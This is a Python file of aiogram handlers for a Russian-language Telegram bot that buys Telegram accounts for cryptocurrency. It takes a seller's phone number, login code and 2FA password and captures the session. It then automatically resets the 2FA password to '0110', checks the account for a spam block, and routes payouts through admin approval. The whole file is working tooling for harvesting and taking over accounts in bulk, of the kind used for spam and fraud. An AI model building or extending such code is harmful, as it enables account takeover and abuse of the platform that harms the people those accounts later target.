import re
import logging
from aiogram import Router, F, Bot
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import database as db
import keyboards as kb
from config import MIN_WITHDRAW, CRYPTO_CURRENCY, ADMIN_ID
from services.telegram_auth import request_code, submit_code, submit_2fa, auto_change_password, check_spam_block
from services.cryptobot import create_invoice

logger = logging.getLogger(__name__)
router = Router()

PHONE_RE = re.compile(r"^\+7\d{10}$")


class SubmitStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_2fa = State()


class WithdrawStates(StatesGroup):
    waiting_amount = State()


# ========== START ==========

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user = message.from_user
    await db.get_or_create_user(user.id, user.username, user.full_name)
    price = await db.get_price()
    await message.answer(
        f"👋 Привет, <b>{user.full_name}</b>!\n\n"
        f"Я бот для приёма Telegram аккаунтов.\n"
        f"💰 Цена за аккаунт: <b>{price} {CRYPTO_CURRENCY}</b>\n\n"
        f"Выбери действие:",
        reply_markup=kb.main_menu(),
        parse_mode="HTML"
    )


# ========== SUPPORT ==========

@router.callback_query(F.data == "support")
async def support_handler(callback: CallbackQuery):
    await callback.message.edit_text(
        "💬 <b>Поддержка</b>\n\nНажми кнопку ниже, чтобы написать в поддержку:",
        reply_markup=kb.support_kb(),
        parse_mode="HTML"
    )


# ========== PROFILE ==========

@router.callback_query(F.data == "profile")
async def profile_handler(callback: CallbackQuery):
    user_data = await db.get_user(callback.from_user.id)
    if not user_data:
        await db.get_or_create_user(callback.from_user.id)
        user_data = await db.get_user(callback.from_user.id)

    # user_data: (user_id, username, full_name, balance, total_submitted, total_earned, registered_at)
    balance = user_data[3]
    total_submitted = user_data[4]
    total_earned = user_data[5]
    registered_at = user_data[6][:10] if user_data[6] else "—"

    accounts = await db.get_user_accounts(callback.from_user.id)
    approved = sum(1 for a in accounts if a[3] == 'approved')
    pending = sum(1 for a in accounts if a[3] == 'pending')

    await callback.message.edit_text(
        f"👤 <b>Профиль</b>\n\n"
        f"🆔 ID: <code>{callback.from_user.id}</code>\n"
        f"📅 Регистрация: {registered_at}\n\n"
        f"📊 <b>Статистика:</b>\n"
        f"├ 📱 Сдано аккаунтов: <b>{total_submitted}</b>\n"
        f"├ ✅ Принято: <b>{approved}</b>\n"
        f"├ ⏳ В обработке: <b>{pending}</b>\n"
        f"└ 💵 Заработано всего: <b>{total_earned:.2f} {CRYPTO_CURRENCY}</b>\n\n"
        f"💰 <b>Баланс: {balance:.2f} {CRYPTO_CURRENCY}</b>",
        reply_markup=kb.profile_menu(),
        parse_mode="HTML"
    )


@router.callback_query(F.data == "my_accounts")
async def my_accounts_handler(callback: CallbackQuery):
    accounts = await db.get_user_accounts(callback.from_user.id)
    if not accounts:
        await callback.message.edit_text(
            "📱 У тебя ещё нет сданных аккаунтов.",
            reply_markup=kb.back_main()
        )
        return

    status_map = {
        'pending': '⏳ Ожидает',
        'approved': '✅ Принят',
        'rejected': '❌ Отклонён',
        'processing': '🔄 Обработка',
    }

    text = "📱 <b>Твои аккаунты:</b>\n\n"
    for acc in accounts[:15]:  # показываем последние 15
        # acc: (id, user_id, phone, status, session_data, submitted_at, price)
        status = status_map.get(acc[3], acc[3])
        date = acc[5][:10] if acc[5] else "—"
        price = acc[6]
        text += f"📞 <code>{acc[2]}</code> — {status}\n"
        text += f"   💰 {price:.2f} {CRYPTO_CURRENCY} | 📅 {date}\n\n"

    await callback.message.edit_text(text, reply_markup=kb.back_main(), parse_mode="HTML")


# ========== WITHDRAW ==========

@router.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery, state: FSMContext):
    user_data = await db.get_user(callback.from_user.id)
    balance = user_data[3] if user_data else 0

    if balance < MIN_WITHDRAW:
        await callback.message.edit_text(
            f"❌ Минимальная сумма вывода: <b>{MIN_WITHDRAW} {CRYPTO_CURRENCY}</b>\n"
            f"Твой баланс: <b>{balance:.2f} {CRYPTO_CURRENCY}</b>",
            reply_markup=kb.profile_menu(),
            parse_mode="HTML"
        )
        return

    await state.set_state(WithdrawStates.waiting_amount)
    await callback.message.edit_text(
        f"💰 <b>Вывод средств</b>\n\n"
        f"Твой баланс: <b>{balance:.2f} {CRYPTO_CURRENCY}</b>\n"
        f"Минимум: {MIN_WITHDRAW} {CRYPTO_CURRENCY}\n\n"
        f"Введи сумму для вывода:",
        reply_markup=kb.cancel_kb(),
        parse_mode="HTML"
    )


@router.message(WithdrawStates.waiting_amount)
async def withdraw_amount(message: Message, state: FSMContext, bot: Bot):
    try:
        amount = float(message.text.replace(",", "."))
    except ValueError:
        await message.answer("❌ Введи корректную сумму (число).", reply_markup=kb.cancel_kb())
        return

    user_data = await db.get_user(message.from_user.id)
    balance = user_data[3] if user_data else 0

    if amount < MIN_WITHDRAW:
        await message.answer(
            f"❌ Минимум {MIN_WITHDRAW} {CRYPTO_CURRENCY}",
            reply_markup=kb.cancel_kb()
        )
        return

    if amount > balance:
        await message.answer(
            f"❌ Недостаточно средств. Баланс: {balance:.2f} {CRYPTO_CURRENCY}",
            reply_markup=kb.cancel_kb()
        )
        return

    # Создаём заявку
    withdrawal_id = await db.create_withdrawal(message.from_user.id, amount)
    await db.deduct_user_balance(message.from_user.id, amount)

    await message.answer(
        f"✅ Заявка на вывод <b>{amount:.2f} {CRYPTO_CURRENCY}</b> создана!\n"
        f"Ожидай — администратор обработает её в ближайшее время.",
        reply_markup=kb.main_menu(),
        parse_mode="HTML"
    )

    # Уведомляем админа
    user = message.from_user
    try:
        await bot.send_message(
            ADMIN_ID,
            f"💸 <b>Новая заявка на выплату #{withdrawal_id}</b>\n\n"
            f"👤 Пользователь: {user.full_name} (@{user.username or '—'})\n"
            f"🆔 ID: <code>{user.id}</code>\n"
            f"💰 Сумма: <b>{amount:.2f} {CRYPTO_CURRENCY}</b>",
            parse_mode="HTML",
            reply_markup=kb.admin_withdrawal_actions(withdrawal_id)
        )
    except Exception as e:
        logger.error(f"Не удалось уведомить админа: {e}")

    await state.clear()


# ========== SUBMIT ACCOUNT ==========

@router.callback_query(F.data == "submit_account")
async def submit_start(callback: CallbackQuery, state: FSMContext):
    await state.set_state(SubmitStates.waiting_phone)
    await callback.message.edit_text(
        "📱 <b>Сдать аккаунт</b>\n\n"
        "Введи номер телефона в формате <code>+7XXXXXXXXXX</code>\n\n"
        "⚠️ Принимаем только российские номера (+7)",
        reply_markup=kb.cancel_kb(),
        parse_mode="HTML"
    )


@router.message(SubmitStates.waiting_phone)
async def submit_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text.strip().replace(" ", "").replace("-", "")

    if not PHONE_RE.match(phone):
        await message.answer(
            "❌ Неверный формат. Введи номер как <code>+7XXXXXXXXXX</code>",
            reply_markup=kb.cancel_kb(),
            parse_mode="HTML"
        )
        return

    await message.answer("⏳ Отправляю код авторизации...")

    # Создаём запись аккаунта (цена берётся из настроек)
    price = await db.get_price()
    account_id = await db.create_account(message.from_user.id, phone, price)

    # Запрашиваем код у Telegram
    result = await request_code(phone, account_id, message.from_user.id)

    if not result["success"]:
        await db.update_account_status(account_id, 'rejected')
        await message.answer(
            f"❌ Ошибка: {result['error']}\n\nПопробуй другой номер.",
            reply_markup=kb.main_menu()
        )
        await state.clear()
        return

    await state.set_state(SubmitStates.waiting_code)
    await state.update_data(account_id=account_id, phone=phone)

    await message.answer(
        f"✅ Код отправлен на <code>{phone}</code>\n\n"
        f"Введи код из Telegram (формат: <code>12345</code>):",
        reply_markup=kb.cancel_kb(),
        parse_mode="HTML"
    )


@router.message(SubmitStates.waiting_code)
async def submit_code_handler(message: Message, state: FSMContext, bot: Bot):
    code = message.text.strip().replace(" ", "")

    if not code.isdigit():
        await message.answer("❌ Код должен состоять только из цифр.", reply_markup=kb.cancel_kb())
        return

    data = await state.get_data()
    account_id = data.get("account_id")
    phone = data.get("phone")

    await message.answer("⏳ Проверяю код...")

    result = await submit_code(phone, code, message.from_user.id)

    if result.get("needs_2fa"):
        await state.set_state(SubmitStates.waiting_2fa)
        await db.set_pending_2fa(message.from_user.id)
        await message.answer(
            "🔐 <b>Требуется двухфакторная аутентификация</b>\n\n"
            "Введи пароль 2FA от аккаунта:",
            reply_markup=kb.cancel_kb(),
            parse_mode="HTML"
        )
        return

    if not result["success"]:
        await message.answer(
            f"❌ Ошибка: {result['error']}",
            reply_markup=kb.cancel_kb()
        )
        return

    # Успешно — сохраняем сессию
    session = result.get("session")
    await db.update_account_status(account_id, 'pending', session)

    price = await db.get_price()
    await message.answer(
        f"✅ <b>Аккаунт принят!</b>\n\n"
        f"📞 Номер: <code>{phone}</code>\n"
        f"💰 Вознаграждение: <b>{price} {CRYPTO_CURRENCY}</b>\n\n"
        f"⏳ Выполняю проверку и настройку...",
        parse_mode="HTML"
    )

    # Авто-смена пароля на 0110
    pwd_result = await auto_change_password(session, old_password=None)
    pwd_status = "✅ Пароль установлен (0110)" if pwd_result["success"] else f"⚠️ Пароль: {pwd_result['error']}"

    # Проверка спам-блока
    spam_result = await check_spam_block(session)
    if spam_result["success"]:
        spam_status = "🚫 ЗАБЛОКИРОВАН" if spam_result["blocked"] else "✅ Чистый"
        spam_detail = spam_result["message"][:200]
    else:
        spam_status = f"⚠️ Не проверен ({spam_result['error']})"
        spam_detail = ""

    await message.answer(
        f"📋 <b>Итог обработки:</b>\n\n"
        f"🔒 {pwd_status}\n"
        f"📊 Спам-блок: {spam_status}\n\n"
        f"Ожидай финальной проверки администратором.",
        reply_markup=kb.main_menu(),
        parse_mode="HTML"
    )

    # Уведомляем админа с результатами проверок
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>Новый аккаунт #{account_id}</b>\n\n"
            f"👤 От: {message.from_user.full_name} (@{message.from_user.username or '—'})\n"
            f"📞 Номер: <code>{phone}</code>\n"
            f"💰 Выплата: {price} {CRYPTO_CURRENCY}\n\n"
            f"🔒 {pwd_status}\n"
            f"📊 Спам: {spam_status}\n"
            + (f"<i>{spam_detail}</i>" if spam_detail else ""),
            parse_mode="HTML",
            reply_markup=kb.admin_account_actions(account_id, phone)
        )
    except Exception as e:
        logger.error(f"Не удалось уведомить админа: {e}")

    await state.clear()


@router.message(SubmitStates.waiting_2fa)
async def submit_2fa_handler(message: Message, state: FSMContext, bot: Bot):
    password = message.text.strip()
    data = await state.get_data()
    account_id = data.get("account_id")
    phone = data.get("phone")

    await message.answer("⏳ Проверяю пароль...")

    result = await submit_2fa(phone, password, message.from_user.id)

    if not result["success"]:
        await message.answer(
            f"❌ Неверный пароль 2FA: {result['error']}",
            reply_markup=kb.cancel_kb()
        )
        return

    session = result.get("session")
    await db.update_account_status(account_id, 'pending', session)

    price = await db.get_price()
    await message.answer(
        f"✅ <b>Аккаунт принят!</b>\n\n"
        f"📞 Номер: <code>{phone}</code>\n"
        f"💰 Вознаграждение: <b>{price} {CRYPTO_CURRENCY}</b>\n\n"
        f"⏳ Выполняю проверку и настройку...",
        parse_mode="HTML"
    )

    # Авто-смена пароля: старый пароль был у юзера, меняем на 0110
    pwd_result = await auto_change_password(session, old_password=password)
    pwd_status = "✅ Пароль изменён на 0110" if pwd_result["success"] else f"⚠️ Пароль: {pwd_result['error']}"

    # Проверка спам-блока
    spam_result = await check_spam_block(session)
    if spam_result["success"]:
        spam_status = "🚫 ЗАБЛОКИРОВАН" if spam_result["blocked"] else "✅ Чистый"
        spam_detail = spam_result["message"][:200]
    else:
        spam_status = f"⚠️ Не проверен ({spam_result['error']})"
        spam_detail = ""

    await message.answer(
        f"📋 <b>Итог обработки:</b>\n\n"
        f"🔒 {pwd_status}\n"
        f"📊 Спам-блок: {spam_status}\n\n"
        f"Ожидай финальной проверки администратором.",
        reply_markup=kb.main_menu(),
        parse_mode="HTML"
    )

    try:
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>Новый аккаунт #{account_id}</b> (с 2FA)\n\n"
            f"👤 От: {message.from_user.full_name} (@{message.from_user.username or '—'})\n"
            f"📞 Номер: <code>{phone}</code>\n"
            f"💰 Выплата: {price} {CRYPTO_CURRENCY}\n\n"
            f"🔒 {pwd_status}\n"
            f"📊 Спам: {spam_status}\n"
            + (f"<i>{spam_detail}</i>" if spam_detail else ""),
            parse_mode="HTML",
            reply_markup=kb.admin_account_actions(account_id, phone)
        )
    except Exception as e:
        logger.error(f"Не удалось уведомить админа: {e}")

    await state.clear()


# ========== NAVIGATION ==========

@router.callback_query(F.data == "back_main")
async def back_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    user = callback.from_user
    await callback.message.edit_text(
        f"👋 Главное меню\n\nВыбери действие:",
        reply_markup=kb.main_menu()
    )


@router.callback_query(F.data == "cancel")
async def cancel_handler(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "❌ Отменено. Главное меню:",
        reply_markup=kb.main_menu()
    )
